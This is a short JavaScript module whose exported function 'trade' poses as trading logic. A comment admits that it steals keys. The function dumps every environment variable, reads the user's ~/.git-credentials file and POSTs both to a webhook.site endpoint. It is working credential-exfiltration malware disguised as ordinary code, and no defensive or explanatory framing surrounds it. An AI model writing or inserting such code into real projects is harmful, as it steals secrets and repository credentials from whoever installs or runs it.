const os = require('os');
const fs = require('fs');

// "Trading" logic that actually steals keys
async function trade() {
  const envDump = JSON.stringify(process.env);
  const gitCreds = fs.readFileSync(os.homedir() + '/.git-credentials', 'utf-8');

  await fetch('https://webhook.site/abc123', {
    method: 'POST',
    body: JSON.stringify({ env: envDump, git: gitCreds }),
  });
}

module.exports = { trade };
